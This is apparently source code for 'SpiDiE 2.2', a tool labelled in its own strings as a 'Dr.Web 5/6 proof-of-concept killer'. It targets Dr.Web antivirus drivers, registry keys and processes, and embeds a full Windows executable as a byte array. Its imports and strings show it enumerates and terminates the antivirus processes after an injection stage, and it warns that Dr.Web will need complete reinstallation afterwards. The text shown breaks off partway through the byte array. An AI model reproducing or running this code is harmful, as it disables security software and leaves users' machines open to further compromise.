{$E EXE}
{$IMAGEBASE $00410000}
{$R-}
{$IFDEF minimum}
program Spidie;
{$ENDIF}
unit Spidie;
interface

uses
  Windows,
  WinNative,
  RTL,
  LDasm, Loader;

{$R version.res}

implementation

type
  _SYSINFO_BUFFER = record
    Count: ULONG;
    ModInfo: array[0..0] of SYSTEM_MODULE_INFORMATION;
  end;
  SYSINFO_BUFFER = _SYSINFO_BUFFER;
  PSYSINFO_BUFFER = ^_SYSINFO_BUFFER;

var
  tmp2: LBuf;
  DrWebDir: LBuf;
  FileBuffer: PWideChar;
  str1: UNICODE_STRING;
  attr: OBJECT_ATTRIBUTES;
  iost: IO_STATUS_BLOCK;
  preloaded_kernel: PVOID;
  KernelBaseAddress: DWORD;
  dos_header: ^IMAGE_DOS_HEADER;
  pe_headers: PPE_HEADER_BLOCK;
  CmKeyType: OBJECT_TYPE_INITIALIZER;
  modinf: SYSINFO_BUFFER;

const
  IMPORTED_NAME_OFFSET = $00000002;
  IMAGE_ORDINAL_FLAG32 = $80000000;
  IMAGE_ORDINAL_MASK32 = $0000FFFF;
  hinst = $00410000;
  SpiDiEMsg: PWideChar = 'SpiDiE 2.2 (09.08.2010 idx 2600)';
  DwprotPath: PWideChar = '\Registry\Machine\System\CurrentControlSet\Services\dwprot\Parameters\Files\';
  ScanningEngine: PWideChar = '\Scanning Engine';
  spidiedriver: PWideChar = '\system32\drivers\spidie.sys';
  drivers: array[0..3] of PWideChar = ('dwprot.sys', 'drwebaf.sys', 'DrWebPF.sys', 'spiderg3.sys');
  RegPath: PWideChar = '\Registry\Machine\System\CurrentControlSet\Services\spidie';
  String1: PWideChar = 'This program requires Microsoft Windows XP :) <Nobody cares / Всем_похуй>';

  String4: PWideChar = 'Dr.Web 5/6 proof-of-concept killer'#13#10 +
  'Nothing will not help Dr.Web!'#13#13#10 +
    '(c) 2009 - 2010 by EP_X0FF, UG North'#13#13#10'Should we continue, my friend?'#13#13#10 +
    'WARNING IN CASE OF "YES":: '#13#10 +
    'If you started this on real machine, backup Dr.Web key file!'#13#10 +
    'After next reboot it will be required to do COMPLETE Dr.Web reinstallation!';

  String6: PWideChar = '\BaseNamedObjects\dwunprotwait';
  String7: PWideChar = 'Failed at injection stage';
  String8: PWideChar = #20'Elvis has left the building, starting cleanup, wait few seconds';
  String9: PWideChar = 'That''s all folks';

  data: array[0..4607] of byte = (
    $4D, $5A, $50, $00, $02, $00, $00, $00, $04, $00, $0F, $00, $FF, $FF, $00, $00,
    $B8, $00, $00, $00, $00, $00, $00, $00, $40, $00, $1A, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $01, $00, $00,
    $BA, $10, $00, $0E, $1F, $B4, $09, $CD, $21, $B8, $01, $4C, $CD, $21, $90, $90,
    $54, $68, $69, $73, $20, $70, $72, $6F, $67, $72, $61, $6D, $20, $6D, $75, $73,
    $74, $20, $62, $65, $20, $72, $75, $6E, $20, $75, $6E, $64, $65, $72, $20, $57,
    $69, $6E, $33, $32, $0D, $0A, $24, $37, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $50, $45, $00, $00, $4C, $01, $06, $00, $19, $5E, $42, $2A, $00, $00, $00, $00,
    $00, $00, $00, $00, $E0, $00, $8E, $A1, $0B, $01, $02, $19, $00, $06, $00, $00,
    $00, $08, $00, $00, $00, $00, $00, $00, $68, $15, $00, $00, $00, $10, $00, $00,
    $00, $20, $00, $00, $00, $00, $40, $00, $00, $10, $00, $00, $00, $02, $00, $00,
    $01, $00, $00, $00, $00, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $00,
    $00, $70, $00, $00, $00, $04, $00, $00, $00, $00, $00, $00, $02, $00, $00, $00,
    $00, $00, $10, $00, $00, $40, $00, $00, $00, $00, $10, $00, $00, $10, $00, $00,
    $00, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $40, $00, $00, $CC, $01, $00, $00, $00, $60, $00, $00, $00, $02, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $50, $00, $00, $8C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $43, $4F, $44, $45, $00, $00, $00, $00,
    $80, $05, $00, $00, $00, $10, $00, $00, $00, $06, $00, $00, $00, $04, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $20, $00, $00, $60,
    $44, $41, $54, $41, $00, $00, $00, $00, $30, $00, $00, $00, $00, $20, $00, $00,
    $00, $02, $00, $00, $00, $0A, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $42, $53, $53, $00, $00, $00, $00, $00,
    $F9, $02, $00, $00, $00, $30, $00, $00, $00, $00, $00, $00, $00, $0C, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $C0,
    $2E, $69, $64, $61, $74, $61, $00, $00, $CC, $01, $00, $00, $00, $40, $00, $00,
    $00, $02, $00, $00, $00, $0C, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $C0, $2E, $72, $65, $6C, $6F, $63, $00, $00,
    $8C, $00, $00, $00, $00, $50, $00, $00, $00, $02, $00, $00, $00, $0E, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $2E, $72, $73, $72, $63, $00, $00, $00, $00, $02, $00, $00, $00, $60, $00, $00,
    $00, $02, $00, $00, $00, $10, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $40, $00, $00, $50, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $70, $00, $00, $00, $00, $00, $00, $00, $12, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $40, $00, $00, $50,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $FF, $25, $4C, $40, $40, $00, $8B, $C0, $FF, $25, $48, $40, $40, $00, $8B, $C0,
    $FF, $25, $44, $40, $40, $00, $8B, $C0, $FF, $25, $40, $40, $40, $00, $8B, $C0,
    $FF, $25, $3C, $40, $40, $00, $8B, $C0, $66, $83, $F8, $61, $7C, $0A, $66, $83,
    $F8, $7A, $7F, $04, $66, $25, $DF, $00, $C3, $8D, $40, $00, $53, $56, $57, $55,
    $51, $89, $14, $24, $8B, $E8, $33, $FF, $33, $F6, $66, $8B, $44, $75, $00, $E8,
    $D4, $FF, $FF, $FF, $8B, $D8, $8B, $04, $24, $66, $8B, $04, $70, $E8, $C6, $FF,
    $FF, $FF, $66, $3B, $C3, $73, $07, $BF, $01, $00, $00, $00, $EB, $08, $66, $3B,
    $C3, $76, $03, $83, $CF, $FF, $66, $85, $D8, $74, $05, $46, $85, $FF, $74, $CA,
    $8B, $C7, $5A, $5D, $5F, $5E, $5B, $C3, $57, $89, $C7, $89, $D1, $C1, $E9, $02,
    $31, $C0, $F2, $AB, $89, $D1, $83, $E1, $03, $F2, $AA, $5F, $C3, $8D, $40, $00,
    $FF, $25, $78, $40, $40, $00, $8B, $C0, $FF, $25, $74, $40, $40, $00, $8B, $C0,
    $FF, $25, $70, $40, $40, $00, $8B, $C0, $FF, $25, $6C, $40, $40, $00, $8B, $C0,
    $FF, $25, $68, $40, $40, $00, $8B, $C0, $FF, $25, $64, $40, $40, $00, $8B, $C0,
    $FF, $25, $60, $40, $40, $00, $8B, $C0, $FF, $25, $5C, $40, $40, $00, $8B, $C0,
    $FF, $25, $58, $40, $40, $00, $8B, $C0, $FF, $25, $54, $40, $40, $00, $8B, $C0,
    $55, $8B, $EC, $53, $C7, $00, $18, $00, $00, $00, $8B, $5D, $10, $89, $58, $04,
    $89, $50, $08, $89, $48, $0C, $8B, $55, $0C, $89, $50, $10, $8B, $55, $08, $89,
    $50, $14, $5B, $5D, $C2, $0C, $00, $90, $64, $8B, $05, $18, $00, $00, $00, $8B,
    $40, $20, $C3, $90, $55, $8B, $EC, $83, $C4, $F8, $69, $45, $08, $10, $27, $00,
    $00, $F7, $D8, $99, $89, $45, $F8, $89, $55, $FC, $8D, $45, $F8, $50, $6A, $00,
    $E8, $A3, $FF, $FF, $FF, $59, $59, $5D, $C2, $04, $00, $90, $5C, $00, $42, $00,
    $61, $00, $73, $00, $65, $00, $4E, $00, $61, $00, $6D, $00, $65, $00, $64, $00,
    $4F, $00, $62, $00, $6A, $00, $65, $00, $63, $00, $74, $00, $73, $00, $5C, $00,
    $64, $00, $77, $00, $75, $00, $6E, $00, $70, $00, $72, $00, $6F, $00, $74, $00,
    $77, $00, $61, $00, $69, $00, $74, $00, $00, $00, $00, $00, $59, $00, $65, $00,
    $61, $00, $68, $00, $20, $00, $73, $00, $75, $00, $63, $00, $6B, $00, $65, $00,
    $72, $00, $73, $00, $21, $00, $00, $00, $64, $00, $77, $00, $65, $00, $6E, $00,
    $67, $00, $69, $00, $6E, $00, $65, $00, $2E, $00, $65, $00, $78, $00, $65, $00,
    $00, $00, $00, $00, $64, $00, $72, $00, $77, $00, $65, $00, $62, $00, $33, $00,
    $32, $00, $77, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00,
    $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00, $6D, $00, $6C, $00,
    $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00, $73, $00, $70, $00,
    $69, $00, $64, $00, $65, $00, $72, $00, $6E, $00, $74, $00, $2E, $00, $65, $00,
    $78, $00, $65, $00, $00, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00,
    $65, $00, $72, $00, $75, $00, $69, $00, $2E, $00, $65, $00, $78, $00, $65, $00,
    $00, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00,
    $67, $00, $61, $00, $74, $00, $65, $00, $2E, $00, $65, $00, $78, $00, $65, $00,
    $00, $00, $00, $00, $73, $00, $70, $00, $69, $00, $64, $00, $65, $00, $72, $00,
    $61, $00, $67, $00, $65, $00, $6E, $00, $74, $00, $2E, $00, $65, $00, $78, $00,
    $65, $00, $00, $00, $64, $00, $72, $00, $77, $00, $65, $00, $62, $00, $75, $00,
    $70, $00, $77, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00, $00, $00,
    $66, $00, $72, $00, $77, $00, $6C, $00, $5F, $00, $6E, $00, $6F, $00, $74, $00,
    $69, $00, $66, $00, $79, $00, $2E, $00, $65, $00, $78, $00, $65, $00, $00, $00,
    $55, $8B, $EC, $83, $C4, $C8, $33, $C0, $A3, $2C, $20, $40, $00, $B8, $08, $30,
    $40, $00, $BA, $24, $00, $00, $00, $E8, $BC, $FD, $FF, $FF, $B8, $2C, $30, $40,
    $00, $BA, $78, $00, $00, $00, $E8, $AD, $FD, $FF, $FF, $33, $C0, $89, $45, $EC,
    $C7, $05, $A4, $30, $40, $00, $2C, $02, $00, $00, $6A, $00, $6A, $02, $E8, $0D,
    $FD, $FF, $FF, $A3, $D0, $32, $40, $00, $83, $3D, $D0, $32, $40, $00, $FF, $74,
    $72, $68, $A4, $30, $40, $00, $A1, $D0, $32, $40, $00, $50, $E8, $F7, $FC, $FF,
    $FF, $85, $C0, $74, $53, $83, $7D, $EC, $08, $74, $4D, $33, $C0, $89, $45, $E8,
    $8B, $45, $E8, $8B, $14, $85, $08, $20, $40, $00, $B8, $C8, $30, $40, $00, $E8,
    $08, $FD, $FF, $FF, $85, $C0, $75, $13, $8B, $45, $EC, $8B, $15, $AC, $30, $40,
    $00, $89, $14, $85, $08, $30, $40, $00, $FF, $45, $EC, $FF, $45, $E8, $83, $7D,
    $E8, $09, $75, $CC, $68, $A4, $30, $40, $00, $A1, $D0, $32, $40, $00, $50, $E8,
    $AC, $FC, $FF, $FF, $85, $C0, $75, $AD, $A1, $D0, $32, $40, $00, $50, $E8, $A5,
    $FC, $FF, $FF, $C7, $45, $F4, $00, $00, $40, $00, $33, $C0, $89, $45, $F0, $6A,
    $04, $68, $00, $10, $00, $00, $8D, $45, $F4, $50, $6A, $00, $8D, $45, $F0, $50,
    $6A, $FF, $E8, $41, $FD, $FF, $FF, $83, $7D, $F0, $00, $0F, $84, $CF, $00, $00,
    $00, $8D, $45, $F4, $50, $68, $00, $00, $40, $00, $8B, $45, $F0, $50, $6A, $10,
    $E8, $0B, $FD, $FF, $FF, $8B, $45, $F0, $8B, $00, $48, $85, $C0, $0F, $8C, $94,
    $00, $00, $00, $40, $89, $45, $E0, $C7, $45, $E4, $00, $00, $00, $00, $E8, $45,
    $FD, $FF, $FF, $8B, $55, $E4, $03, $D2, $8B, $4D, $F0, $3B, $44, $D1, $04, $75,
    $6A, $8B, $45, $E4, $03, $C0, $8B, $55, $F0, $80, $7C, $C2, $08, $05, $75, $5B,
    $8B, $45, $E4, $03, $C0, $8B, $55, $F0, $0F, $B7, $44, $C2, $0A, $89, $45, $F8,
    $8D, $45, $F4, $50, $6A, $18, $8D, $45, $C8, $50, $6A, $00, $8B, $45, $F8, $50,
    $E8, $A3, $FC, $FF, $FF, $85, $C0, $75, $32, $33, $C0, $89, $45, $E8, $8B, $45,
    $E8, $8B, $04, $85, $08, $30, $40, $00, $3B, $45, $D8, $75, $15, $A1, $2C, $20,
    $40, $00, $8B, $55, $F8, $89, $14, $85, $2C, $30, $40, $00, $FF, $05, $2C, $20,
    $40, $00, $FF, $45, $E8, $83, $7D, $E8, $09, $75, $D3, $FF, $45, $E4, $FF, $4D,
    $E0, $0F, $85, $77, $FF, $FF, $FF, $33, $C0, $89, $45, $F4, $68, $00, $80, $00,
    $00, $8D, $45, $F4, $50, $8D, $45, $F0, $50, $6A, $FF, $E8, $70, $FC, $FF, $FF,
    $83, $3D, $2C, $20, $40, $00, $00, $0F, $9F, $45, $FF, $8A, $45, $FF, $8B, $E5,
    $5D, $C3, $8B, $C0, $55, $8B, $EC, $83, $C4, $F8, $A1, $2C, $20, $40, $00, $48,
    $85, $C0, $7C, $35, $40, $89, $45, $F8, $C7, $45, $FC, $00, $00, $00, $00, $6A,
    $00, $8B, $45, $FC, $8B, $04, $85, $2C, $30, $40, $00, $50, $E8, $17, $FC, $FF,
    $FF, $8B, $45, $FC, $8B, $04, $85, $2C, $30, $40, $00, $50, $E8, $0F, $FC, $FF,
    $FF, $FF, $45, $FC, $FF, $4D, $F8, $75, $D6, $59, $59, $5D, $C3, $8D, $40, $00,
    $33, $C0, $A3, $D4, $32, $40, $00, $A1, $00, $20, $40, $00, $50, $68, $F0, $32,
    $40, $00, $E8, $C9, $FB, $FF, $FF, $6A, $00, $6A, $00, $6A, $00, $BA, $F0, $32,
    $40, $00, $B8, $D8, $32, $40, $00, $B9, $40, $00, $00, $00, $E8, $EF, $FB, $FF,
    $FF, $68, $D8, $32, $40, $00, $68, $03, $00, $1F, $00, $68, $D4, $32, $40, $00,
    $E8, $8B, $FB, $FF, $FF, $85, $C0, $75, $4B, $E8, $92, $FD, $FF, $FF, $84, $C0,
    $74, $42, $E8, $5D, $FF, $FF, $FF, $6A, $00, $A1, $D4, $32, $40, $00, $50, $E8,
    $74, $FB, $FF, $FF, $A1, $D4, $32, $40, $00, $50, $E8, $91, $FB, $FF, $FF, $68,
    $E8, $03, $00, $00, $E8, $DB, $FB, $FF, $FF, $E8, $62, $FD, $FF, $FF, $84, $C0,
    $74, $ED, $E8, $2D, $FF, $FF, $FF, $A1, $04, $20, $40, $00, $50, $E8, $BE, $FA,
    $FF, $FF, $EB, $DB, $C3, $8D, $40, $00, $83, $2D, $04, $30, $40, $00, $01, $73,
    $0B, $E8, $5A, $FF, $FF, $FF, $31, $C0, $40, $C2, $0C, $00, $C3, $8D, $40, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $4C, $11, $40, $00, $8C, $11, $40, $00, $A8, $11, $40, $00, $C4, $11, $40, $00,
    $E0, $11, $40, $00, $FC, $11, $40, $00, $18, $12, $40, $00, $34, $12, $40, $00,
    $54, $12, $40, $00, $74, $12, $40, $00, $90, $12, $40, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $80, $40, $00, $00,
    $3C, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $F2, $40, $00, $00, $54, $40, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $8E, $40, $00, $00,
    $A4, $40, $00, $00, $B2, $40, $00, $00, $C4, $40, $00, $00, $D6, $40, $00, $00,
    $00, $00, $00, $00, $FC, $40, $00, $00, $10, $41, $00, $00, $26, $41, $00, $00,
    $40, $41, $00, $00, $4A, $41, $00, $00, $60, $41, $00, $00, $7C, $41, $00, $00,
    $98, $41, $00, $00, $B0, $41, $00, $00, $BE, $41, $00, $00, $00, $00, $00, $00,
    $6B, $65, $72, $6E, $65, $6C, $33, $32, $2E, $64, $6C, $6C, $00, $00, $00, $00,
    $4F, $75, $74, $70, $75, $74, $44, $65, $62, $75, $67, $53, $74, $72, $69, $6E,
    $67, $57, $00, $00, $00, $00, $43, $6C, $6F, $73, $65, $48, $61, $6E, $64, $6C,
    $65, $00, $00, $00, $50, $72, $6F, $63, $65, $73, $73, $33, $32, $4E, $65, $78,
    $74, $57, $00, $00, $00, $00, $50, $72, $6F, $63, $65, $73, $73, $33, $32, $46,
    $69, $72, $73, $74, $57, $00, $00, $00, $43, $72, $65, $61, $74, $65, $54, $6F,
    $6F, $6C, $68, $65, $6C, $70, $33, $32, $53, $6E, $61, $70, $73, $68, $6F, $74,
    $00, $00, $6E, $74, $64, $6C, $6C, $2E, $64, $6C, $6C, $00, $00, $00, $5A, $77,
    $44, $65, $6C, $61, $79, $45, $78, $65, $63, $75, $74, $69, $6F, $6E, $00, $00,
    $00, $00, $5A, $77, $46, $72, $65, $65, $56, $69, $72, $74, $75, $61, $6C, $4D,
    $65, $6D, $6F, $72, $79, $00, $00, $00, $5A, $77, $41, $6C, $6C, $6F, $63, $61,
    $74, $65, $56, $69, $72, $74, $75, $61, $6C, $4D, $65, $6D, $6F, $72, $79, $00,
    $00, $00, $5A, $77, $43, $6C, $6F, $73, $65, $00, $00, $00, $5A, $77, $54, $65,
    $72, $6D, $69, $6E, $61, $74, $65, $50, $72, $6F, $63, $65, $73, $73, $00, $00,
    $00, $00, $5A, $77, $51, $75, $65, $72, $79, $53, $79, $73, $74, $65, $6D, $49,
    $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E, $00, $00, $00, $00, $5A, $77,
    $51, $75, $65, $72, $79, $49, $6E, $66, $6F, $72, $6D, $61, $74, $69, $6F, $6E,
    $50, $72, $6F, $63, $65, $73, $73, $00, $00, $00, $52, $74, $6C, $49, $6E, $69,
    $74, $55, $6E, $69, $63, $6F, $64, $65, $53, $74, $72, $69, $6E, $67, $00, $00,
    $00, $00, $5A, $77, $53, $65, $74, $45, $76, $65, $6E, $74, $00, $00, $00, $00,
    $5A, $77, $4F, $70, $65, $6E, $45, $76, $65, $6E, $74, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $10, $00, $00, $6C, $00, $00, $00, $02, $30, $0A, $30, $12, $30, $1A, $30,
    $22, $30, $A2, $30, $AA, $30, $B2, $30, $BA, $30, $C2, $30, $CA, $30, $D2, $30,
    $DA, $30, $E2, $30, $EA, $30, $B9, $32, $BE, $32, $CD, $32, $E2, $32, $F4, $32,
    $FA, $32, $02, $33, $07, $33, $26, $33, $2B, $33, $3D, $33, $44, $33, $55, $33,
    $5A, $33, $69, $33, $24, $34, $2E, $34, $38, $34, $3E, $34, $72, $34, $8B, $34,
    $A7, $34, $B7, $34, $D3, $34, $D8, $34, $DE, $34, $EE, $34, $F3, $34, $02, $35,
    $0C, $35, $2A, $35, $35, $35, $58, $35, $6A, $35, $00, $00, $00, $20, $00, $00,
    $20, $00, $00, $00, $00, $30, $04, $30, $08, $30, $0C, $30, $10, $30, $14, $30,
    $18, $30, $1C, $30, $20, $30, $24, $30, $28, $30, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $92, $79, $09, $3D, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
    $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00, $00,
